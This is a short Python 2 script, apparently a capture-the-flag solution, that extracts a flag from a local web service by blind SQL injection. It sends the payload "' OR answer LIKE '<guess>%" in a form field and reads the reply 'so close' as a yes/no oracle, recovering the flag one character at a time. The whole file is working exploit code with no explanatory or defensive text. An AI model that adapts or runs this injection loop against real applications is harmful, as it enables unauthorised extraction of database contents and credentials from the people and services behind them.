#!/usr/bin python

import requests
import string

url = "http://localhost:8888"
alphabet = string.printable.replace('%', '').replace("'", '')

flag = ''
while 1:
    for c in alphabet:
    	print "guess flag: ", flag+c
        params = {"answer": "' OR answer LIKE '" + flag+c + "%"}
        r = requests.post(url, data=params)
        print r.text
        if "so close" in r.text:
            flag += c
            break

    if c == alphabet[-1]:
    	break

# note: _ just like ? in bash
print "flag = ", flag[:4]+"{"+flag[5:-1]+"}"
